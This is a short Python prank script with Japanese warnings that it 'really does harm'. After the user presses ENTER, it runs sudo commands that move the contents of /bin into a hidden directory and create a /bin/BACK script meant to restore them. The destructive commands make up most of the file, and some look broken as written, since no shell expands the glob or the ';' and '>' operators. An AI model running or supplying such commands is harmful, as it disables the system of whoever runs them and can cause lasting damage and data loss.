import Text as txt
import subprocess as cmd

def TextOut():
	yield 'このプログラムは、本当に危害を加えます'
	yield txt.printText('いいんだね?', 1)
for n in TextOut():
	print(n)
	input()

print('READY?(ENTER) '); input()

def CMDOut():
	yield 'sudo mkdir /.OLDcommands'
	yield 'sudo mv /bin/* /.OLDcommands'
	yield 'sudo touch /bin/BACK; sudo /.OLDcommands/chmod 777 /bin/BACK'
	yield 'echo "sudo /.OLDcommands/mv /.OLDcommands/* /bin/; rmdir /.OLDcommands/; rm /bin/BACK" > /bin/BACK'
for n in CMDOut():
	cmd.call(n.split(' '))

